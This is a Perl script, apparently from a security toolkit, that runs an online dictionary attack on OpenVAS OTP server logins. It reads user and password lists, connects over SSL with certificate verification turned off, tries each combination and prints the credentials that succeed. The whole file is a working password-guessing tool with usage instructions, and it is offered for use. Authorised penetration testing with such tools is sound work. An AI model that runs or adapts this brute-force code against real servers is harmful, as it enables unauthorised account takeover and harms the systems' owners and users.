#!/usr/bin/perl
# OpenVAS OTP password cracker
# Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL

use strict;
use IO::Socket::SSL;
use Getopt::Long;

my $verbose = 0;
my $ov_host = "localhost";
my $ov_port = "9390";
my $ov_hello = "< OTP/1.0 >\n";
my $maxreq = 16;
my $timeout = 15;
my $userfile;
my $passfile;

Getopt::Long::Configure ("bundling");

my $result = GetOptions (
	"i|ip=s" => \$ov_host,
	"p|port=i" => \$ov_port,
	"U|users=s" => \$userfile,
	"P|passwords=s" => \$passfile,
	"m|maxreq=i" => \$maxreq,
	"t|timeout=i" => \$timeout,
	"v|verbose+"  => \$verbose,
	"h|help" => \&help
);

unless ($userfile and $passfile) {
	help();
}

print STDERR "OpenVAS OTP password cracker. (C) Kost. Distributed under GPL.\n\n";

open(USER,"<$userfile") or die ("cannot open user file $userfile: $!");
open(PASS,"<$passfile") or die ("cannot open password file $passfile: $!");

print STDERR "[i] Cracking.\n";

while(<USER>) {
	chomp;
	my $user = $_;
	while (<PASS>) {
		chomp;
		my $password = $_;
		ov_guess ($user, $password);
	}
	seek (PASS,0,0);
}

sub ov_guess {
	my ($user, $password) = @_;
	my $ov_sock = IO::Socket::SSL->new(
			  PeerAddr        => $ov_host,
			  PeerPort        => $ov_port,
			  SSL_verify_mode => 0,
			  Timeout         => $timeout
			  );
	if(!$ov_sock) {
		warn ("Cannot connect to sock: $!");
		return;
	}
	$ov_sock->autoflush();

	$ov_sock->print($ov_hello);
	my $line = $ov_sock->getline;

	if(!defined($line)) { 
		$ov_sock->close(SSL_ctx_free => 1);
		warn ("Hmm. No answer. Is it OpenVAS server or TCP wrapped ?");
		return;
	}

	if($line eq $ov_hello) {
		print STDERR "[d] Handshake OK\n" if ($verbose>3);
	} else {
		$ov_sock->close(SSL_ctx_free => 1);
		warn ("Hmm. Strange answer. Is it OpenVAS server?");
		return;
	}

	print STDERR "[d] Sending login data: " if ($verbose>3);
	$ov_sock->print($user ."\n");
	$ov_sock->print($password . "\n");
	print STDERR "done!\n" if ($verbose>3);

	print STDERR "[d] Waiting for answer line: " if ($verbose>3);
	$line = $ov_sock->getline;
	print STDERR "done!\n" if ($verbose>3);

	unless ($ov_sock->connected) {
		print STDERR "[i] Combination $user:$password: Disconnected\n" if ($verbose>0);
	}

	if($line =~ /Bad login/gis) {
		print STDERR "[i] Combination $user:$password: Wrong\n" if ($verbose>1);
	} elsif ($line =~ /SERVER <|>.*<|> SERVER/gis) {
		print STDERR "[i] Combination $user:$password: Sucess\n" if ($verbose>1);
		print "[o] Success! User: $user and Password: $password\n";
	} else {
		print STDERR "[i] Combination $user:$password: Unknown\n" if ($verbose>0);
	}

	$ov_sock->close(SSL_ctx_free => 1);
}

sub help 
{
	print "$0: OpenVAS OTP password cracker. \n";
	print "Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.\n\n";
	print "Usage: $0 -i 127.0.0.1 -p 9390 -U userlist.txt -P passlist.txt\n\n";
	print "	-i <i>	Use target IP <i> (default: $ov_host)\n";
	print "	-p <p>	Use port <p> (default: $ov_port)\n";
	print "	-U <U>	Use user list <U>\n";
	print "	-P <P>	Use password list <P>\n";
	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
	print "	-t <t>	use sock timeout <t>\n";
	print "	-v	verbose\n";
	print "	-h 	this help message\n";
	exit (0);
} 
